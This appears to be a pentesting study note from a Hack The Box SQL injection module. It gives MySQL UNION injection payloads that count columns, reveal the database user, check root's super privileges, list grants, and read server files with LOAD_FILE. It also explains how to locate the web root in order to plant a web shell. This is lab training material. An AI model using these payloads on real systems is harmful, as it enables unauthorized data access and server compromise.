
## Display DB User

- `SELECT USER()` returns the username and hostname used (eg:- `username@localhost`) used by the client to attempt authentication inside the sql server.
- `SELECT CURRENT_USER()` returns the username and hostname that the sql server accepted for authenticating the client.
- `USER()` returns the current username and hostname in the sql server.

```mysql
SELECT USER(), SELECT CURRENT_USER(), SELECT user from mysql.user();
```

## Check User Privileges

```mysql
SELECT super_priv FROM mysql.user
```

---
## Payloads for Exploitation

### Read the Rules Before Injecting Payload

[[Web Pentesting/HTB/Server Side Attacks/SQL Injection/Exploitation/Database Enumeration/Commands|Commands]]

### STEP 1 -> Check Number of Columns

- It works opposite to `ORDER BY`. We need to keep doing it until we get a success message. So if we get success at **4**, then there are 4 columns but their display order can vary. Some columns might not be displayed but are returned during query.

```mysql
cn' UNION SELECT 1,2,3,4-- '
```

### Payload to display Current User

- `USER()` returns the current username and hostname in the sql server.

```mysql
cn' UNION SELECT 1, user(), 3, 4-- -
```

## Payload to check if User has Admin Privileges 

- Checks if the user has super admin privileges.
- If super admin privileges are there it returns `Y`.

```mysql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

## Payload to display all User Privileges

- Provide the `username` and `hostname` used to authenticate yourself inside the sql server.
- Finding all privileges of the current user.

```mysql
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'<username>'@'<hostname>'"-- -
```

### Finding Web Root Directory

- If we have `FILE` privileges then we can load and read the file using the below payload.
- `file_path` is the file inside the target web which we want to load and read.
- **Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
- The `conf` files might point where the root web directory is so that we can write our webshell code there later.

```mysql
cn' UNION SELECT 1, LOAD_FILE("<file_path>"), 3, 4-- -
```

